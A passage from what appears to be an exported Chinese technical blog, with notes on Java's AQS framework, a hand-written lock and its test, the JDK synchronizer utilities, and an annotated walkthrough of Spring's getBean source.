<p><code>release(int arg)</code>：独占式释放资源模板</p>
</li>
</ul>
<p><strong>共享资源（不响应线程中断）</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>tryAcquireShared(int arg)</code>：共享式获取资源，返回值大于等于0则表示获取成功，否则获取失败，子类实现</p>
</li>
<li class="lvl-2">
<p><code>acquireShared(int arg)</code>：共享式获取资源模板</p>
</li>
<li class="lvl-2">
<p><code>tryReleaseShared(int arg)</code>：共享式释放资源，子类实现</p>
</li>
<li class="lvl-2">
<p><code>releaseShared(int arg)</code>：共享式释放资源模板</p>
</li>
</ul>
<h2 id="3-1-内部类Node">3.1 内部类Node</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405152109388.png" alt="image.png"></p>
<h3 id="3-1-1-waitStatus等待状态">3.1.1 waitStatus等待状态</h3>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406101149821.png" alt="image.png"></p>
<h2 id="3-2-条件变量">3.2 条件变量</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202406101159487.png" alt="image.png"></p>
<p><a href="https://blog.csdn.net/agonie201218/article/details/128150609">谈谈Java多线程离不开的AQS_java中aqs-CSDN博客</a></p>
<h1>4 AQS实现</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>tryAcquire</p>
</li>
<li class="lvl-2">
<p>tryRelease</p>
</li>
<li class="lvl-2">
<p>tryAcquireShared</p>
</li>
<li class="lvl-2">
<p>tryReleaseShared</p>
</li>
<li class="lvl-2">
<p>isHeldExclusively</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAQS</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Sync</span> <span class="variable">sync</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Sync</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span>&#123;</span><br><span class="line">        sync.acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isLocked</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.isHeldExclusively();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 静态内部类，继承AQS，重写钩子方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Sync</span> <span class="keyword">extends</span> <span class="title class_">AbstractQueuedSynchronizer</span> &#123;</span><br><span class="line">        <span class="comment">//独占方式，尝试获取资源</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryAcquire</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(compareAndSetState(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获取锁成功&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;获取锁失败&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//独占方式，尝试释放资源</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryRelease</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(getState() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalMonitorStateException</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            setExclusiveOwnerThread(<span class="literal">null</span>);</span><br><span class="line">            setState(<span class="number">0</span>);</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;释放锁成功！&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isHeldExclusively</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> getState() == <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAQSTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> MyAQS myAQS=<span class="keyword">new</span> <span class="title class_">MyAQS</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">use</span><span class="params">()</span>&#123;</span><br><span class="line">        myAQS.lock();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(InterruptedException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            myAQS.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        MyAQSTest test=<span class="keyword">new</span> <span class="title class_">MyAQSTest</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                test.use();</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://mp.weixin.qq.com/s/W_bs-vG5zUDPW2GLwaBttQ">美团一面，面试官让介绍AQS原理并手写一个同步器，直接凉了 (qq.com)</a></p>
<h1>5 同步工具类</h1>
<h2 id="5-1-Semaphore-信号量">5.1 Semaphore(信号量)</h2>
<p><code>synchronized</code> 和 <code>ReentrantLock</code> 都是一次只允许一个线程访问某个资源，而<code>Semaphore</code>(信号量)可以用来控制同时访问特定资源的线程数量。</p>
<h2 id="5-2-CountDownLatch-倒计时器">5.2 CountDownLatch(倒计时器)</h2>
<p><code>CountDownLatch</code> 允许 <code>count</code> 个线程阻塞在一个地方，直至所有线程的任务都执行完毕。</p>
<p><code>CountDownLatch</code> 是一次性的，计数器的值只能在构造方法中初始化一次，之后没有任何机制再次对其设置值，当 <code>CountDownLatch</code> 使用完毕后，它不能再次被使用。</p>
<h2 id="5-3-CyclicBarrier-循环栅栏">5.3 CyclicBarrier(循环栅栏)</h2>
<p><code>CyclicBarrier</code> 和 <code>CountDownLatch</code> 非常类似，它也可以实现线程间的技术等待，但是它的功能比 <code>CountDownLatch</code> 更加复杂和强大。主要应用场景和 <code>CountDownLatch</code> 类似。</p>
<blockquote>
<p><code>CountDownLatch</code> 的实现是基于 AQS 的，而 <code>CycliBarrier</code> 是基于 <code>ReentrantLock</code>(<code>ReentrantLock</code> 也属于 AQS 同步器)和 <code>Condition</code> 的。</p>
</blockquote>
<p><code>CyclicBarrier</code> 的字面意思是可循环使用（Cyclic）的屏障（Barrier）。它要做的事情是：让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续干活。</p>
<p><a href="https://javaguide.cn/java/concurrent/aqs.html">AQS 详解 | JavaGuide</a><br>
<a href="https://www.cnblogs.com/waterystone/p/4920797.html">Java并发之AQS详解 - waterystone - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring源码：getBean流程</title>
    <url>/2024/01/10/%E6%A1%86%E6%9E%B6/Spring/Spring%E6%BA%90%E7%A0%81%EF%BC%9AgetBean%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202403132110955.png" alt="spring-获取bean.png"></p>
<h1>1 doGetBean</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>transformedBeanName，处理别名BeanName、处理带&amp;符的工厂BeanName。</p>
</li>
<li class="lvl-2">
<p>getSingleton，先尝试从缓存中获取Bean实例，这个位置就是三级缓存解决循环依赖的方法。</p>
</li>
<li class="lvl-2">
<p>getObjectForBeanInstance，如果 sharedInstance 是普通的 Bean 实例，则下面的方法会直接返回。另外 sharedInstance 是工厂Bean类型，则需要获取 getObject 方法，可以参考关于 FactoryBean 的实现类。</p>
</li>
<li class="lvl-2">
<p>isPrototypeCurrentlyInCreation，循环依赖有三种，setter注入、多实例和构造函数，Spring 只能解决 setter 注入，所以这里是 Prototype 则会抛出异常。</p>
</li>
<li class="lvl-2">
<p>getParentBeanFactory，父 bean 工厂存在，当前 bean 不存在于当前bean工厂，则到父工厂查找 bean 实例。</p>
</li>
<li class="lvl-2">
<p>originalBeanName，获取 name 对应的 beanName，如果 name 是以 &amp; 开头，则返回 &amp; + beanName</p>
</li>
<li class="lvl-2">
<p>args != null，根据 args 参数是否为空，调用不同的父容器方法获取 bean 实例</p>
</li>
<li class="lvl-2">
<p>!typeCheckOnly，typeCheckOnly，用于判断调用 getBean 方法时，是否仅是做类型检查，如果不是只做类型检查，就会调用 markBeanAsCreated 进行记录</p>
</li>
<li class="lvl-2">
<p>mbd.getDependsOn，处理使用了 depends-on 注解的依赖创建 bean 实例</p>
</li>
<li class="lvl-2">
<p>isDependent，监测是否存在 depends-on 循环依赖，若存在则会抛出异常</p>
</li>
<li class="lvl-2">
<p>registerDependentBean，注册依赖记录</p>
</li>
<li class="lvl-2">
<p>getBean(dep)，加载 depends-on 依赖（dep 是 depends-on 缩写）</p>
</li>
<li class="lvl-2">
<p>mbd.isSingleton()，创建单例 bean 实例</p>
</li>
<li class="lvl-2">
<p>mbd.isPrototype()，创建其他类型的 bean 实例</p>
</li>
<li class="lvl-2">
<p>return (T) bean，返回 Bean 实例</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Return an instance, which may be shared or independent, of the specified bean.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name the name of the bean to retrieve</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> requiredType the required type of the bean to retrieve</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args arguments to use when creating a bean instance using explicit arguments</span></span><br><span class="line"><span class="comment"> * (only applied when creating a new instance as opposed to retrieving an existing one)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> typeCheckOnly whether the instance is obtained for a type check,</span></span><br><span class="line"><span class="comment"> * not for actual use</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an instance of the bean</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> BeansException if the bean could not be created</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">doGetBean</span><span class="params">(</span></span><br><span class="line"><span class="params">		String name, <span class="meta">@Nullable</span> Class&lt;T&gt; requiredType, <span class="meta">@Nullable</span> Object[] args, <span class="type">boolean</span> typeCheckOnly)</span></span><br><span class="line">		<span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">	<span class="comment">//处理别名name，获取规范名beanName</span></span><br><span class="line">	<span class="comment">//处理带&amp;符的工厂(FactoryBean)beanName</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> transformedBeanName(name);</span><br><span class="line">	Object beanInstance;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Eagerly check singleton cache for manually registered singletons.</span></span><br><span class="line">	<span class="comment">//从缓存中获取Bean实例，三级缓存解决循环依赖(singletonObjects, earlySingletonObjects, singletonFactories)</span></span><br><span class="line">	<span class="type">Object</span> <span class="variable">sharedInstance</span> <span class="operator">=</span> getSingleton(beanName);</span><br><span class="line">	<span class="comment">//args 传参其实是 null 的，但是如果 args 不为空的时候，那么意味着调用方不是希望获取 Bean，而是创建 Bean</span></span><br><span class="line">	<span class="keyword">if</span> (sharedInstance != <span class="literal">null</span> &amp;&amp; args == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="comment">//1. sharedInstance是普通的bean实例，直接返回</span></span><br><span class="line">		<span class="comment">//2. sharedInstance是FactoryBean类型，则通过FactoryBean实现类的getObject方法获取</span></span><br><span class="line">		beanInstance = getObjectForBeanInstance(sharedInstance, name, beanName, <span class="literal">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Fail if we&#x27;re already creating this bean instance:</span></span><br><span class="line">		<span class="comment">// We&#x27;re assumably within a circular reference.</span></span><br><span class="line">		<span class="comment">//循环依赖有三种：setter注入(singleton)，setter注入(prototype)，构造函数</span></span><br><span class="line">		<span class="comment">//spring解决setter注入(singleton)，提前暴露创建中的bean</span></span><br><span class="line">		<span class="keyword">if</span> (isPrototypeCurrentlyInCreation(beanName)) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCurrentlyInCreationException</span>(beanName);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Check if bean definition exists in this factory.</span></span><br><span class="line">		<span class="comment">//1. 父bean工厂存在</span></span><br><span class="line">		<span class="comment">//2. beanName不存在于当前Bean工厂，则到父工厂查找bean实例</span></span><br><span class="line">		<span class="type">BeanFactory</span> <span class="variable">parentBeanFactory</span> <span class="operator">=</span> getParentBeanFactory();</span><br><span class="line">		<span class="keyword">if</span> (parentBeanFactory != <span class="literal">null</span> &amp;&amp; !containsBeanDefinition(beanName)) &#123;</span><br><span class="line">			<span class="comment">// Not found -&gt; check parent.</span></span><br><span class="line">			<span class="comment">// 获取 name 对应的 beanName，如果 name 是以 &amp; 开头，则返回 &amp; + beanName</span></span><br><span class="line">			<span class="type">String</span> <span class="variable">nameToLookup</span> <span class="operator">=</span> originalBeanName(name);</span><br><span class="line">			<span class="keyword">if</span> (parentBeanFactory <span class="keyword">instanceof</span> AbstractBeanFactory abf) &#123;</span><br><span class="line">				<span class="keyword">return</span> abf.doGetBean(nameToLookup, requiredType, args, typeCheckOnly);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (args != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="comment">// Delegation to parent with explicit args.</span></span><br><span class="line">				<span class="keyword">return</span> (T) parentBeanFactory.getBean(nameToLookup, args);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (requiredType != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="comment">// No args -&gt; delegate to standard getBean method.</span></span><br><span class="line">				<span class="keyword">return</span> parentBeanFactory.getBean(nameToLookup, requiredType);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> (T) parentBeanFactory.getBean(nameToLookup);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 1. typeCheckOnly，用于判断调用 getBean 方法时，是否仅是做类型检查</span></span><br><span class="line">       	<span class="comment">// 2. 如果不是只做类型检查，就会调用 markBeanAsCreated 进行记录</span></span><br><span class="line">		<span class="keyword">if</span> (!typeCheckOnly) &#123;</span><br><span class="line">			markBeanAsCreated(beanName);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//创建bean</span></span><br><span class="line">		<span class="comment">//singleton：容器中还没有创建过此bean</span></span><br><span class="line">		<span class="comment">//prototype：每次调用都要创建一个新的bean</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (requiredType != <span class="literal">null</span>) &#123;</span><br><span class="line">				beanCreation.tag(<span class="string">&quot;beanType&quot;</span>, requiredType::toString);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="type">RootBeanDefinition</span> <span class="variable">mbd</span> <span class="operator">=</span> getMergedLocalBeanDefinition(beanName);</span><br><span class="line">			<span class="comment">// 检查当前创建的 bean 定义是否为抽象 bean 定义</span></span><br><span class="line">			checkMergedBeanDefinition(mbd, beanName, args);</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Guarantee initialization of beans that the current bean depends on.</span></span><br><span class="line">			<span class="comment">// 处理使用了 depends-on 注解的依赖创建 bean 实例</span></span><br><span class="line">			String[] dependsOn = mbd.getDependsOn();</span><br><span class="line">			<span class="keyword">if</span> (dependsOn != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (String dep : dependsOn) &#123;</span><br><span class="line">					<span class="comment">//检测是否存在depends-on循环依赖</span></span><br><span class="line">					<span class="keyword">if</span> (isDependent(beanName, dep)) &#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName,</span><br><span class="line">								<span class="string">&quot;Circular depends-on relationship between &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + dep + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="comment">//注册依赖记录</span></span><br><span class="line">					registerDependentBean(dep, beanName);</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						getBean(dep);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span> (NoSuchBeanDefinitionException ex) &#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanCreationException</span>(mbd.getResourceDescription(), beanName,</span><br><span class="line">								<span class="string">&quot;&#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27; depends on missing bean &#x27;&quot;</span> + dep + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Create bean instance.</span></span><br><span class="line">			<span class="comment">//创建bean实例(singleton)</span></span><br><span class="line">			<span class="keyword">if</span> (mbd.isSingleton()) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// 把 beanName 和 new ObjectFactory 匿名内部类传入回调</span></span><br><span class="line">				sharedInstance = getSingleton(beanName, () -&gt; &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						<span class="keyword">return</span> createBean(beanName, mbd, args);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">						<span class="comment">// Explicitly remove instance from singleton cache: It might have been put there</span></span><br><span class="line">						<span class="comment">// eagerly by the creation process, to allow for circular reference resolution.</span></span><br><span class="line">						<span class="comment">// Also remove any beans that received a temporary reference to the bean.</span></span><br><span class="line">						destroySingleton(beanName);</span><br><span class="line">						<span class="keyword">throw</span> ex;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;);</span><br><span class="line">				beanInstance = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//创建bean实例(prototype)</span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (mbd.isPrototype()) &#123;</span><br><span class="line">				<span class="comment">// It&#x27;s a prototype -&gt; create a new instance.</span></span><br><span class="line">				<span class="type">Object</span> <span class="variable">prototypeInstance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					beforePrototypeCreation(beanName);</span><br><span class="line">					prototypeInstance = createBean(beanName, mbd, args);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">finally</span> &#123;</span><br><span class="line">					afterPrototypeCreation(beanName);</span><br><span class="line">				&#125;</span><br><span class="line">				beanInstance = getObjectForBeanInstance(prototypeInstance, name, beanName, mbd);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//创建bean实例</span></span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="type">String</span> <span class="variable">scopeName</span> <span class="operator">=</span> mbd.getScope();</span><br><span class="line">				<span class="type">Scope</span> <span class="variable">scope</span> <span class="operator">=</span> <span class="built_in">this</span>.scopes.get(scopeName);</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					<span class="type">Object</span> <span class="variable">scopedInstance</span> <span class="operator">=</span> scope.get(beanName, () -&gt; &#123;</span><br><span class="line">						beforePrototypeCreation(beanName);</span><br><span class="line">						<span class="keyword">try</span> &#123;</span><br><span class="line">							<span class="keyword">return</span> createBean(beanName, mbd, args);</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">finally</span> &#123;</span><br><span class="line">							afterPrototypeCreation(beanName);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;);</span><br><span class="line">					beanInstance = getObjectForBeanInstance(scopedInstance, name, beanName, mbd);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">catch</span> (IllegalStateException ex) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ScopeNotActiveException</span>(beanName, scopeName, ex);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">			cleanupAfterBeanCreationFailure(beanName);</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果需要类型转换，这里会进行操作</span></span><br><span class="line">	<span class="keyword">if</span> (requiredType != <span class="literal">null</span> &amp;&amp; bean != <span class="literal">null</span> &amp;&amp; !requiredType.isInstance(bean)) &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> getTypeConverter().convertIfNecessary(bean, requiredType);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (TypeMismatchException ex) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">&quot;Failed to convert bean &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; to required type &#x27;&quot;</span> +</span><br><span class="line">						ClassUtils.getQualifiedName(requiredType) + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanNotOfRequiredTypeException</span>(name, requiredType, bean.getClass());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回 Bean</span></span><br><span class="line">	<span class="keyword">return</span> (T) bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 transformedBeanName</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">protected</span> String <span class="title function_">transformedBeanName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.canonicalName(BeanFactoryUtils.transformedBeanName(name));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//处理FactoryBean的&amp;标记</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">transformedBeanName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">    Assert.notNull(name, <span class="string">&quot;&#x27;name&#x27; must not be null&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    String beanName;  </span><br><span class="line">    <span class="keyword">for</span>(beanName = name; beanName.startsWith(<span class="string">&quot;&amp;&quot;</span>); beanName = beanName.substring(<span class="string">&quot;&amp;&quot;</span>.length())) &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> beanName;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理别名</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">canonicalName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">canonicalName</span> <span class="operator">=</span> name;  </span><br><span class="line">  </span><br><span class="line">    String resolvedName;  </span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        resolvedName = (String)<span class="built_in">this</span>.aliasMap.get(canonicalName);  </span><br><span class="line">        <span class="keyword">if</span> (resolvedName != <span class="literal">null</span>) &#123;  </span><br><span class="line">            canonicalName = resolvedName;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">while</span>(resolvedName != <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> canonicalName;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用 FactoryBean 创建出的对象，会在 DefaultListableBeanFactory 初始化的时候，使用 getBean(FACTORY_BEAN_PREFIX + beanName) 给 beanName 加上 &amp; <code>(String FACTORY_BEAN_PREFIX = &quot;&amp;&quot;)</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">preInstantiateSingletons()&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.isFactoryBean(beanName)) &#123;  </span><br><span class="line">    <span class="keyword">final</span> FactoryBean&lt;?&gt; factory = (FactoryBean)<span class="built_in">this</span>.getBean(<span class="string">&quot;&amp;&quot;</span> + beanName);  </span><br><span class="line">    <span class="type">boolean</span> isEagerInit;  </span><br><span class="line">    <span class="keyword">if</span> (System.getSecurityManager() != <span class="literal">null</span> &amp;&amp; factory <span class="keyword">instanceof</span> SmartFactoryBean) &#123;  </span><br><span class="line">        isEagerInit = (Boolean)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Boolean&gt;() &#123;  </span><br><span class="line">            <span class="keyword">public</span> Boolean <span class="title function_">run</span><span class="params">()</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> ((SmartFactoryBean)factory).isEagerInit();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;, <span class="built_in">this</span>.getAccessControlContext());  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        isEagerInit = factory <span class="keyword">instanceof</span> SmartFactoryBean &amp;&amp; ((SmartFactoryBean)factory).isEagerInit();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (isEagerInit) &#123;  </span><br><span class="line">        <span class="built_in">this</span>.getBean(beanName);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>3 getSingleton：从缓存中获取 bean 实例</h1>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultSingletonBeanRegistry</span> <span class="keyword">extends</span> <span class="title class_">SimpleAliasRegistry</span> <span class="keyword">implements</span> <span class="title class_">SingletonBeanRegistry</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Maximum number of suppressed exceptions to preserve. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUPPRESSED_EXCEPTIONS_LIMIT</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Cache of singleton objects: bean name to bean instance. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; singletonObjects = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Cache of singleton factories: bean name to ObjectFactory. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ObjectFactory&lt;?&gt;&gt; singletonFactories = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/** Cache of early singleton objects: bean name to bean instance. */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; earlySingletonObjects = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span> Object <span class="title 